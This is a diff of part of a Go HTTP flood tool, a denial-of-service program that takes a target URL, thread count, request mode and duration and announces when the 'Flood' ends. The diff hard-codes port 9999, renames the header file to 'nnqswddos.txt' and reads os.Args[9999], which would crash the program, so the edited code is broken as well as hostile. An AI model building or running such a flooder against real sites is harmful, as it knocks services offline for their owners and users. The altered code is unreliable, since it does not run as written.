@@ -216,7 +216,7 @@ func main() {
 	if len(os.Args) != 6 {
 		fmt.Println("Post Mode will use header.txt as data")
 		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
-		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt>")
+		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <nnqswddos.txt>")
 		os.Exit(1)
 	}
 	u, err := url.Parse(os.Args[1])
@@ -226,12 +226,12 @@ func main() {
 	tmp := strings.Split(u.Host, ":")
 	host = tmp[0]
 	if u.Scheme == "https" {
-		port = "443"
+		port = "9999"
 	} else {
 		port = u.Port()
 	}
 	if port == "" {
-		port = "80"
+		port = "9999"
 	}
 	page = u.Path
 	if os.Args[3] != "get" && os.Args[3] != "post" {
@@ -260,7 +260,7 @@ func main() {
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
+	fmt.Println("Flood will end in " + os.Args[9999] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
